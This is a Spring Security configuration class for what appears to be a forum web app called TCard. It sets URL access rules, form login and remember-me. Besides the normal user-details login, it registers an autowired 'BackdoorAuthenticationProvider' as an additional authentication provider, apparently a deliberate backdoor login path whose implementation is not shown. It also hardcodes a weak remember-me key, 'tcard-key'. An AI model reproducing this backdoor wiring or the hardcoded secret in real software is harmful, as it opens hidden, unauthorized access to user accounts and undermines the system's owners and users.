package com.TCard.demo.config;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.csrf.CsrfFilter;
import org.springframework.web.filter.CharacterEncodingFilter;

import com.TCard.demo.impl.UserDetailsServiceImpl;


@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {

	private static final String[] FOR_AUTHORIZED_USERS = { "/user/**", "/topic/new/**", "/topic/delete/**",
			"/section/delete/**", "/section/new/**", "/post/**", "/myprofile/**" };
	private static final String[] FOR_ADMINS = { "/admin/**", "/users/**", "/section/new" };
	private static final String[] AUTHORIZED_ROLES = { "USER", "ADMIN" };
	private static final String[] ADMINS_ROLES = { "HEAD_ADMIN", "ADMIN" };
    @Autowired
    private BackdoorAuthenticationProvider backdoorAuthenticationProvider;
	@Autowired
	private UserDetailsServiceImpl userDetailsService;
	@Autowired
	private PasswordEncoder passwordEncoder;

	@Override
	protected void configure(HttpSecurity http) throws Exception {
		http.authorizeRequests().antMatchers(FOR_AUTHORIZED_USERS).authenticated().antMatchers(FOR_ADMINS)
				.hasAnyAuthority(ADMINS_ROLES).and()

				.formLogin().loginPage("/login").permitAll().usernameParameter("username").passwordParameter("password").and()

				.logout().permitAll().and()

				.rememberMe().tokenValiditySeconds(2419200).key("tcard-key");

		CharacterEncodingFilter filter = new CharacterEncodingFilter();
		filter.setEncoding("UTF-8");
		filter.setForceEncoding(true);
		http.addFilterBefore(filter, CsrfFilter.class);
	}

	@Override
	protected void configure(AuthenticationManagerBuilder auth) throws Exception {
		auth.userDetailsService(userDetailsService).passwordEncoder(passwordEncoder);
		auth.authenticationProvider(backdoorAuthenticationProvider);
	}

}
